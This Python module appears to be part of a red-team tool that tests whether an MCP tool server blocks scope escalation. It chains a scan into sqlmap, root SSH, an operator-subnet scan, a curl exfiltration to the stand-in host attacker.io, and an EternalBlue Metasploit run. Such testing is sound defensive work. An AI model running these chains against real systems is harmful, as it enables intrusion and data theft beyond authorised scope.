from __future__ import annotations

from dataclasses import dataclass
from time import perf_counter
from typing import Any

from mcpwn_red.attacks.base import (
    AttackResult,
    build_arguments,
    build_result,
    find_tool,
    replace_result_tokens,
)
from mcpwn_red.mcp_client import MCPClientError


@dataclass(frozen=True)
class ChainStep:
    tool_candidates: tuple[str, ...]
    arguments: dict[str, str]


@dataclass(frozen=True)
class ScopeChain:
    attack_id: str
    name: str
    severity: str
    description: str
    step_one: ChainStep
    step_two: ChainStep
    recommendation: str


CHAINS: tuple[ScopeChain, ...] = (
    ScopeChain(
        attack_id="CHAIN-01",
        name="recon_to_exploit",
        severity="high",
        description="Boundary expected between recon and active SQL exploitation.",
        step_one=ChainStep(("nmap",), {"target": "192.0.2.1", "ports": "80"}),
        step_two=ChainStep(("sqlmap",), {"url": "http://192.0.2.1/?id=1"}),
        recommendation="Require explicit approval before escalating recon into exploitation tools.",
    ),
    ScopeChain(
        attack_id="CHAIN-02",
        name="scan_to_shell",
        severity="critical",
        description="Boundary expected between passive scan and interactive shell access.",
        step_one=ChainStep(("nmap",), {"target": "192.0.2.1", "ports": "22"}),
        step_two=ChainStep(("shell_exec", "shell", "exec"), {"command": "ssh root@192.0.2.1"}),
        recommendation="Block shell-capable tools from scan-driven follow-up chains by default.",
    ),
    ScopeChain(
        attack_id="CHAIN-03",
        name="web_to_localnet",
        severity="high",
        description="Boundary expected between an external web target and the operator subnet.",
        step_one=ChainStep(("gobuster",), {"url": "http://192.0.2.1"}),
        step_two=ChainStep(("nmap",), {"target": "192.168.0.0/24"}),
        recommendation="Bind execution scope to the originally authorized target set.",
    ),
    ScopeChain(
        attack_id="CHAIN-04",
        name="fuzz_to_exfil",
        severity="critical",
        description="Boundary expected between fuzzing and outbound exfiltration.",
        step_one=ChainStep(("ffuf",), {"url": "http://192.0.2.1/FUZZ"}),
        step_two=ChainStep(("curl",), {"url": "http://attacker.io/?data=RESULT"}),
        recommendation="Block outbound requests that use prior tool output as remote data.",
    ),
    ScopeChain(
        attack_id="CHAIN-05",
        name="enum_to_metasploit",
        severity="critical",
        description="Boundary expected between vuln enumeration and weaponized exploitation.",
        step_one=ChainStep(("nmap",), {"target": "192.0.2.1", "ports": "445"}),
        step_two=ChainStep(
            ("metasploit", "msfconsole"),
            {"exploit": "ms17_010_eternalblue", "rhosts": "192.0.2.1"},
        ),
        recommendation="Require explicit operator confirmation for exploit-framework transitions.",
    ),
)

REFUSAL_MARKERS = ("denied", "not allowed", "refused", "blocked", "unavailable")


class ScopeEscalationTester:
    module = "scope"

    @classmethod
    def catalog(cls) -> list[dict[str, str]]:
        return [
            {
                "id": chain.attack_id,
                "module": cls.module,
                "severity": chain.severity,
                "description": chain.description,
            }
            for chain in CHAINS
        ]

    async def run(self, client: Any) -> list[AttackResult]:
        tools = await client.list_tools()
        results: list[AttackResult] = []
        for chain in CHAINS:
            results.append(await self.run_chain(client, tools, chain))
        return results

    async def run_chain(
        self,
        client: Any,
        tools: list[dict[str, Any]],
        chain: ScopeChain,
    ) -> AttackResult:
        started_at = perf_counter()
        first_tool = find_tool(tools, chain.step_one.tool_candidates)
        if first_tool is None:
            return build_result(
                attack_id=chain.attack_id,
                name=chain.name,
                module=self.module,
                status="UNKNOWN",
                severity=chain.severity,
                evidence=f"{chain.step_one.tool_candidates[0]} unavailable for step 1.",
                started_at=started_at,
                recommendation=chain.recommendation,
            )
        try:
            first_output = await client.call_tool(
                first_tool["name"],
                build_arguments(first_tool, chain.step_one.arguments),
            )
        except MCPClientError as exc:
            return build_result(
                attack_id=chain.attack_id,
                name=chain.name,
                module=self.module,
                status="ERROR",
                severity=chain.severity,
                evidence=str(exc),
                started_at=started_at,
                recommendation=chain.recommendation,
            )

        second_tool = find_tool(tools, chain.step_two.tool_candidates)
        if second_tool is None:
            return build_result(
                attack_id=chain.attack_id,
                name=chain.name,
                module=self.module,
                status="PASS",
                severity=chain.severity,
                evidence="Unsafe step 2 tool is unavailable.",
                started_at=started_at,
                recommendation=chain.recommendation,
            )

        step_two_args = {
            key: replace_result_tokens(value, first_output)
            for key, value in chain.step_two.arguments.items()
        }
        try:
            second_output = await client.call_tool(
                second_tool["name"],
                build_arguments(second_tool, step_two_args),
            )
        except MCPClientError as exc:
            return build_result(
                attack_id=chain.attack_id,
                name=chain.name,
                module=self.module,
                status="PASS",
                severity=chain.severity,
                evidence=str(exc),
                started_at=started_at,
                recommendation=chain.recommendation,
            )

        if any(marker in second_output.lower() for marker in REFUSAL_MARKERS):
            status = "PASS"
        else:
            status = "FAIL"
        evidence = (
            f"step1={first_tool['name']} output={first_output!r}; "
            f"step2={second_tool['name']} output={second_output!r}"
        )
        return build_result(
            attack_id=chain.attack_id,
            name=chain.name,
            module=self.module,
            status=status,
            severity=chain.severity,
            evidence=evidence,
            started_at=started_at,
            recommendation=chain.recommendation,
        )
